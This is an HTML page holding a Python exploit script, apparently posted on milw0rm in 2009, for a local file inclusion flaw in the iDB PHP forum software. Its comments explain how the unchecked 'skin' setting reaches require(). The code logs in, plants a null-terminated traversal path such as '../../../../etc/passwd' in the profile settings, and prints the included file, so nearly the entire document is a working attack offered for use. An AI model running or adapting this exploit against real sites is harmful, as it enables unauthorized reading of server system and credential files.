<html><head><title>iDB 0.2.5pa SVN 243 (skin) Local File Inclusion Exploit</title></head><pre>#!/usr/bin/env
# LOTFREE 2009 - lotfree.next-touch.com
# Local require() vulnerability in iDB (a PHP/MySQL BBS)
# Test on version 0.2.5 Pre-Alpha SVN 243 (released March 30, 2009)
#
# No checks are made on var &quot;skin&quot; in inc/profilemain.php before saving it to database
# this value is then require()d in mysql.php as $_GET['theme'] (global var is overwritten) :
#=&gt; require($SettDir['themes'].$_GET['theme'].&quot;/settings.php&quot;);
# so if we set &quot;skin&quot; to (for example) &quot;../../../../../etc/passwd\0&quot; we can get the passwd
# file content :)
# skin is saved to mysql as &quot;UseTheme&quot; in table idb_members
# !! the type is &quot;varchar(26)&quot; so we are limited in injection :( !!
#
# Website of iDB : http://idb.berlios.de/ - http://sourceforge.net/projects/freshmeat_idb/
import urllib, urllib2, sys

print &quot;\tLOTFREE - iDB local PHP file inclusion vulnerability exploit\n&quot;
if len(sys.argv)!=5:
  print &quot;Usage: python LOTF-iDB.py &lt;forum_root&gt; &lt;local_path_for_inclusion&gt; &lt;login&gt; &lt;password&gt;&quot;
  print &quot;e.g: python LOTF-iDB.py http://localhost/iDB/ ../../../../etc/passwd johndoe s3cr3t&quot;
  print &quot;use python LOTF-iDB.py &lt;forum_root&gt; iDB &lt;login&gt; &lt;password&gt; to restore the default skin&quot;
  sys.exit()

forum_root = sys.argv[1]
if forum_root[-1]!=&quot;/&quot;:
  forum_root += &quot;/&quot;
username = sys.argv[3]
password = sys.argv[4]
skin = &quot;&quot;
if sys.argv[2]==&quot;iDB&quot;:
  skin = &quot;iDB&quot;
else:
  skin = sys.argv[2]+&quot;\0&quot;
if len(skin)&gt;26:
  print &quot;Path for inclusion must be lower than 27 chars in length due to SQL structure :(&quot;
  sys.exit()

print &quot;Logging on the server...&quot;
qs = {&quot;username&quot;:username, &quot;userpass&quot;: password, &quot;storecookie&quot;: &quot;true&quot;, &quot;act&quot;: &quot;loginmember&quot;}
req = urllib2.Request(forum_root+&quot;member.php?act=login_now&quot;,urllib.urlencode(qs))
data = urllib2.urlopen(req)
cookies = data.headers.getheaders(&quot;set-cookie&quot;)
cook = []
for c in cookies:
  for t in c.split(&quot;;&quot;):
    if t.find(&quot;=&quot;)&gt;0:
      k = t.split(&quot;=&quot;)[0]
      v = t.split(&quot;=&quot;,1)[1]
      if k in [&quot;idb_sess&quot;, &quot;MemberName&quot;, &quot;UserID&quot;, &quot;SessPass&quot;]:
        cook.append(k+&quot;=&quot;+v)
cook_str = &quot;; &quot;.join(cook)
print &quot;Cookie string:&quot;,cook_str
print


qs = {&quot;YourOffSet&quot; : &quot;0&quot;,
    &quot;MinOffSet&quot; : &quot;00&quot;,
    &quot;skin&quot; : skin,
    &quot;RepliesPerPage&quot; : &quot;10&quot;,
    &quot;TopicsPerPage&quot; : &quot;10&quot;,
    &quot;MessagesPerPage&quot; : &quot;10&quot;,
    &quot;DST&quot; : &quot;off&quot;,
    &quot;act&quot; : &quot;settings&quot;,
    &quot;update&quot; : &quot;now&quot;}
c_headers = {&quot;Cookie&quot;: cook_str, &quot;Referer&quot;: forum_root+&quot;profile.php?act=settings&quot;}
print &quot;Sending payload...&quot;
req = urllib2.Request(forum_root+&quot;profile.php?act=settings&quot;,urllib.urlencode(qs),c_headers)
urllib2.urlopen(req)

req = urllib2.Request(forum_root+&quot;index.php?act=view&quot;,headers=c_headers)
data = urllib2.urlopen(req).read()
# if /etc/passwd was included
if data.find(&quot;root:x:0:0:&quot;)&gt;=0:
  print data.split(&quot;&lt;&quot;)[0]
elif skin==&quot;iDB&quot;:
  print &quot;Default skin restored!&quot;
elif data.find(&quot;require&quot;)&gt;=0:
  print &quot;Oups... file not found or access forbidden :(\n&quot;
  print data[:200]
else:
  print &quot;Output:&quot;
  print data

# milw0rm.com [2009-04-06]</pre></html>